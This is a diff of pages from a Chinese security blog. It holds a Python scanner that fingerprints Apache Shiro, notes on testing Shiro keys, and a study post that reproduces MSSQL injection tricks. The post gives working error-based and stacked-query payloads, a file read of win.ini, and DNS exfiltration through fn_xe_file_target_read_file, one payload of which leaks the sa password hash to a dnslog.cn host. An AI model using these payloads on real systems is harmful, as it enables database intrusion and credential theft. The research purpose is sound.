+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def shiroScan(url):</span><br><span class="line"></span><br><span class="line">    header&#x3D;&#123;</span><br><span class="line">        &#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.66 Safari&#x2F;537.36&#39;,</span><br><span class="line">        &#39;Accept&#39;:&#39;image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,image&#x2F;*,*&#x2F;*;q&#x3D;0.8&#39;,</span><br><span class="line">        &#39;Accept-Encoding&#39;:&#39;gzip, deflate&#39;,</span><br><span class="line">        &#39;Accept-Language&#39;:&#39;zh-CN,zh;q&#x3D;0.9&#39;,</span><br><span class="line">        &#39;Cookie&#39;:&#39;rememberMe&#x3D;1&#39;,</span><br><span class="line">        &#39;Connection&#39;:&#39;close&#39;</span><br><span class="line">        &#125;</span><br><span class="line">    proxies &#x3D; &#123; &quot;http&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:8088&quot;, &quot;https&quot;: &quot;https:&#x2F;&#x2F;127.0.0.1:8088&quot;&#125;</span><br><span class="line">    resp&#x3D;requests.get(url&#x3D;url,headers&#x3D;header,proxies&#x3D;proxies,verify&#x3D;False,allow_redirects&#x3D;False)</span><br><span class="line">    for name, regex in resp.headers.items():</span><br><span class="line">        if &quot;rememberMe&#x3D;deleteMe&quot; in regex:</span><br><span class="line">            print(url+ &quot; is Shiro!!!&quot;)</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    with open(&#39;domain.txt&#39;,&#39;r&#39;) as f:</span><br><span class="line">        lines&#x3D;f.readlines()</span><br><span class="line">        for i in lines:</span><br><span class="line">            domain&#x3D;i.strip(&#39;\n&#39;)</span><br><span class="line">            shiroScan(domain)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201180705142.png" alt="image-20201201180705142"></p>
+<h4 id="如何判断key是否正确？"><a href="#如何判断key是否正确？" class="headerlink" title="如何判断key是否正确？"></a><strong>如何判断key是否正确？</strong></h4><p>​    通过上面的测试我们知道当我们使用的加密key正确可以正常进行反序列化操作，即使key正确，但生成的内容无法正常反序列化，则还是会返回rememberMe=deleteMe，因为反序列化的操作是在convertBytesToPrincipals方法完成的，如果反序列化的过程中出现异常，还是会设置rememberMe=deleteMe这个请求头，因此我们测试key是否正确，需要找到一个可以不依赖第三方组件的java中默认存在且和jdk版本无关的类来进行反序列化。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202094802148.png" alt="image-20201202094802148"></p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202094838261.png" alt="image-20201202094838261"></p>
+<p>​        我尝试使用URLDNS来进行判断，虽然可以正常发起DNS请求，但 由于执行过程中的类型转换错误，因此还是会返回rememberMe=deleteMe。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202100922001.png" alt="image-20201202100922001"></p>
+<p>​        我们正常的登录，看看正常登录过程中的反序列化的类是什么类型</p>
+<p><strong><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202104733807.png" alt="image-20201202104733807"></strong></p>
+<p>​        使用这个rememberMe的内容利用，看shiro再进行反序列化的过程中反序列化的是哪个类？</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202104854538.png" alt="image-20201202104854538"></p>
+<p>​        跟进后发现是反序列化了SimplePrincipalCollection类，所以我们只要创建一个SimplePrincipalCollection对应的对象进行序列化就可以了，当传入的序列化内容可以正常被解析，就不会出现rememberMe=deleteMe，因此可以通过这个特性来判断我们的key是否正确。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202105111202.png" alt="image-20201202105111202"></p>
+<p>​        我们查看一下ShiroExploit这个工具，看看他是怎么实现的。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202105408945.png" alt="image-20201202105408945"></p>
+<p>​    这个工具在检测key是否正确的过程中调用了ysoserial的ShiroCheck，可我去查看ysoserial的github项目，发现并没有这个选项，也就是这个是作者自己扩展编写的。我们反编译ShiroExploit自带的ysoserial，他的实现也非常简单，就是创建一个SimplePrincipalCollection对象。</p>
+<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202105609290.png" alt="image-20201202105609290"></p>
+<h4 id="如何检测利用链？"><a href="#如何检测利用链？" class="headerlink" title="如何检测利用链？"></a>如何检测利用链？</h4><p>​        在JAVA的反序列化漏洞中，仅仅找到readObject反序列化并不一定能造成RCE，还有一点比较重要的是需要找到利用链，这个要具体展开讲需要依赖的知识点有点多，我之后会单独写一篇文章来讲解。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">关于sqlserver注入另类技巧的学习</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-11-13 16:50:19" itemprop="dateCreated datePublished" datetime="2020-11-13T16:50:19+08:00">2020-11-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-11-19 15:20:27" itemprop="dateModified" datetime="2020-11-19T15:20:27+08:00">2020-11-19</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>​    最近看到国外一篇关于<a href="https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/" target="_blank" rel="noopener">mssql注入利用</a>的文章，里面用了很多技巧我之前一直不知道，所以自己对这些技巧进行了复现,本次测试的环境为SQLSERVER2008</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>​    之前对于SQLSERVER报错注入理解仅限于类型转换导致的报错的利用方法，这次看到有很多新的函数可以进行报错注入利用，我把每个函数的测试单独取出来进行测试。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SUSER_NAME()</span><br><span class="line">USER_NAME()</span><br><span class="line">PERMISSIONS()</span><br><span class="line">DB_NAME()</span><br><span class="line">FILE_NAME()</span><br><span class="line">TYPE_NAME()</span><br><span class="line">COL_NAME()</span><br></pre></td></tr></table></figure>
+
+<p>​        SUSER_NAME()函数本来的作用是通过用户的id返回用户名,那id是int型的，由于我们输入的语句返回结果是varchar类型，因此会导致类型转换异常和报错，如下所示：</p>
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113165830418.png" alt="image-20201113165830418"></p>
+<p>​    我们已经可以看到报错了，但是如果想要获取更多的信息怎么办，还能通过这个函数来进行报错注入的利用吗？可以的，语句如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SUSER_NAME((select @@version))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113170131763.png" alt="image-20201113170131763"></p>
+<p>获取表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SUSER_NAME((select top 1 table_name from information_schema.tables))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113170346115.png" alt="image-20201113170346115"></p>
+<p>上面是直接执行的结果，如果我们放到具体的注入语句里该怎么用？使用方法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tn_Attitudes where id &#x3D;1 and 1&#x3D;SUSER_NAME(@@version)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172402013.png" alt="image-20201113172402013"></p>
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172434689.png" alt="image-20201113172434689"></p>
+<p>​    其他函数的用法类似，所以不一一说明了，下面给出利用的截图</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;USER_NAME((select top 1 table_name from information_schema.tables))	</span><br><span class="line">and 1&#x3D;PERMISSIONS((select top 1 table_name from information_schema.tables))	</span><br><span class="line">and 1&#x3D;DB_NAME((select top 1 table_name from information_schema.tables))	</span><br><span class="line">and 1&#x3D;FILE_NAME((select top 1 table_name from information_schema.tables))	</span><br><span class="line">and 1&#x3D;TYPE_NAME((select top 1 table_name from information_schema.tables))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172656283.png" alt="image-20201113172656283"></p>
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172708675.png" alt="image-20201113172708675"></p>
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172721793.png" alt="image-20201113172721793"></p>
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172733723.png" alt="image-20201113172733723"></p>
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172755049.png" alt="image-20201113172755049"></p>
+<pre><code>最后一个函数COL_NAME有一点不一样，需要两个参数</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;COL_NAME((select top 1 table_name from information_schema.tables),1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172912410.png" alt="image-20201113172912410"></p>
+<p>​    这些函数都有一个特性，就是他们输入的值都为int，返回值为varchar，我们可以利用这个特征去找其他可能导致报错注入的函数，之所以要了解这些函数，我们可以在利用报错注入某些函数被拦截的时候，通过替换为其他函数的方式来利用报错注入。</p>
+<h2 id="快速获取数据的小技巧"><a href="#快速获取数据的小技巧" class="headerlink" title="快速获取数据的小技巧"></a>快速获取数据的小技巧</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>​    我个人觉得MSSQL的报错注入比较鸡肋，因为MSSQL注入点一般都会支持堆叠查询，通过报错注入获取数据的速度远不如堆叠注入获取数据的速度快，这里我给出堆叠注入快速获取数据的方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @listStr VARCHAR(MAX) DECLARE @myoutput VARCHAR(MAX) SET @listStr &#x3D; &#39;&#39; SELECT @listStr &#x3D; @listStr + Name + &#39;,&#39; FROM master..sysdatabases SELECT @myoutput &#x3D; SUBSTRING(@listStr , 1, LEN(@listStr)-1) SELECT CAST(@myoutput as int)  列出所有数据库</span><br><span class="line"></span><br><span class="line">DECLARE @listStr VARCHAR(MAX) DECLARE @myoutput VARCHAR(MAX)  SET @listStr &#x3D; &#39;&#39; SELECT @listStr &#x3D; @listStr + Name + &#39;,&#39; FROM 数据库名..sysobjects WHERE type &#x3D; &#39;U&#39; SELECT @myoutput &#x3D; SUBSTRING(@listStr , 1, LEN(@listStr)-1) SELECT CAST(@myoutput as int)  列出所有的表</span><br><span class="line"></span><br><span class="line">DECLARE @listStr VARCHAR(MAX) DECLARE @myoutput VARCHAR(MAX) SET @listStr &#x3D; &#39;&#39; SELECT @listStr &#x3D; @listStr + Name + &#39;,&#39; FROM 数据库名..syscolumns WHERE id&#x3D;object_id(&#39;表名&#39;) SELECT @myoutput &#x3D; SUBSTRING(@listStr , 1, LEN(@listStr)-1) select cast(@myoutput as int) </span><br><span class="line">列出所有的列</span><br></pre></td></tr></table></figure>
+
+<p>获取所有数据库</p>
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113173622807.png" alt="image-20201113173622807"></p>
+<p>获取所有表名</p>
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113173643045.png" alt="image-20201113173643045"></p>
+<p>获取所有列名</p>
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113173732520.png" alt="image-20201113173732520"></p>
+<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>​    在MSSQL 2016及以后支持使用FOR JSON AUTO函数，我们可以使用这个函数结合联合查询获取数据,由于我本地的数据库版本比较低，所以复现不了这种利用方式，这里给出作者的Payload和截图</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vuln.app&#x2F;getItem?id&#x3D;1&#39;+and+1&#x3D;(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113200720930.png" alt="image-20201113200720930"></p>
+<h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><p>​    还是由于环境的问题，无法复现这种利用方式，给出作者的payload和截图</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vuln.app&#x2F;getItem?id&#x3D;1&#39;+and+1&#x3D;(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113201003499.png" alt="image-20201113201003499"></p>
+<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a><strong>文件读取</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT BulkColumn FROM OPENROWSET(BULK N&#39;C:\Windows\win.ini&#39;, SINGLE_BLOB) as document</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119114708244.png" alt="image-20201119114708244"></p>
+<p>​    我尝试在报错注入中用到这种方法，但是并没有成功利用，但是可以在union联合查询中利用该方法读取文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tn_AtUsers where id&#x3D;-1 union select  null,(SELECT BulkColumn FROM OPENROWSET(BULK N&#39;C:\Windows\win.ini&#39;, SINGLE_BLOB) as document),null,null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119115448908.png" alt="image-20201119115448908"></p>
+<h2 id="获取当前正在执行的语句"><a href="#获取当前正在执行的语句" class="headerlink" title="获取当前正在执行的语句"></a>获取当前正在执行的语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119115716185.png" alt="image-20201119115716185"></p>
+<p>​    这种语句在报错注入中仍然是有效的</p>
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119115821821.png" alt="image-20201119115821821"></p>
+<h2 id="DNS注入"><a href="#DNS注入" class="headerlink" title="DNS注入"></a>DNS注入</h2><p>​    通过fn_xe_file_target_read_file加载UNC路径请求DNS,虽然这个函数第一个和第二个参数都是文件路径，但实际上会先去请求第一个参数对应的路径，所以一般情况下最好用第一个参数加载执行，当我们多次请求同一个UNC路径，只会执行第一次，所以每次执行完后，最好将前面的路径稍微改一下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from fn_xe_file_target_read_file(&#39;\\1a.idbfh8.dnslog.cn\1.xem&#39;,&#39;1.xem&#39;,null,null)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119133707689.png" alt="image-20201119133707689"></p>
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119133712427.png" alt="image-20201119133712427"></p>
+<p>​    在什么情况下可以用fn_xe_file_target_read_file的第二个参数进行利用呢，答案是当第一个参数指定的路径存在的情况下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from fn_xe_file_target_read_file(&#39;c:\windows\win.ini&#39;,&#39;\\jtf50t.dnslog.cn\1.xem&#39;,null,null)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119133934287.png" alt="image-20201119133934287"></p>
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119133951324.png" alt="image-20201119133951324"></p>
+<p>​    我测试了报错注入和UNION下利用这种方式外带数据，都是不行的，但在where后添加EXISTS函数执行是可以的,这里有一个小坑，<strong>就是and前面的参数的内容必须是存在的，才会执行DNS请求，否则不会执行成功。</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tn_AuditItems where DisplayOrder&#x3D;121 and exists(select * from fn_xe_file_target_read_file(&#39;\\1a.myg9zc.dnslog.cn\1.xem&#39;,&#39;1.xem&#39;,null,null))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119141927943.png" alt="image-20201119141927943"></p>
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119141953818.png" alt="image-20201119141953818"></p>
+<p>​    还有一个问题是我们如果想要利用这种方式外带数据，该怎么利用，这个语句因为出现了+号，所以在get提交时需要注意URL编码的问题。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tn_AuditItems where DisplayOrder&#x3D;121 and exists(select * from fn_xe_file_target_read_file(&#39;\\&#39;+(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name&#x3D;&#39;sa&#39;)+&#39;.myg9zc.dnslog.cn\1.xem&#39;,&#39;1.xem&#39;,null,null))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119142531471.png" alt="image-20201119142531471"></p>
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119142548412.png" alt="image-20201119142548412"></p>
+<p>​        和fn_xe_file_target_read_file类似的函数还有fn_get_audit_file，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from fn_get_audit_file(&#39;\\zwbqeg.dnslog.cn\11.xxx&#39;,default,default)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119142900030.png" alt="image-20201119142900030"></p>
+<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119142908659.png" alt="image-20201119142908659"></p>
+<p>​    作者还提供了fn_trace_gettable函数，不过这种利用方式我并没有复现成功。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    对于该作者挖掘到这些关于注入利用的函数，我们肯定也在想他是如何找到这些函数的，这里我大致做一下分析。</p>
+<p><strong>报错注入函数</strong></p>
+<p>​    我查阅了一些资料，这些函数都有一些共同点，就是接收的参数是int型的参数，并且返回值是varchar类型，如果我们想要挖掘其他的可以报错的函数，可以寻找这种类型的函数。</p>
+<p><strong>DNS注入函数</strong></p>
+<p>​    DNS外带数据的函数也比较明显，就是他们都是文件操作的函数，也就是说会进行文件读取操作的函数，那如果给这些函数的参数传入UNC路径的内容，就可能会存在DNS请求。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
     <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1657,254 +2044,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="藏青">
-      <meta itemprop="description" content="知行合一">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="藏青's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于Malleable C2的学习总结</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2020-09-02 10:27:15 / Modified: 20:03:48" itemprop="dateCreated datePublished" datetime="2020-09-02T10:27:15+08:00">2020-09-02</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
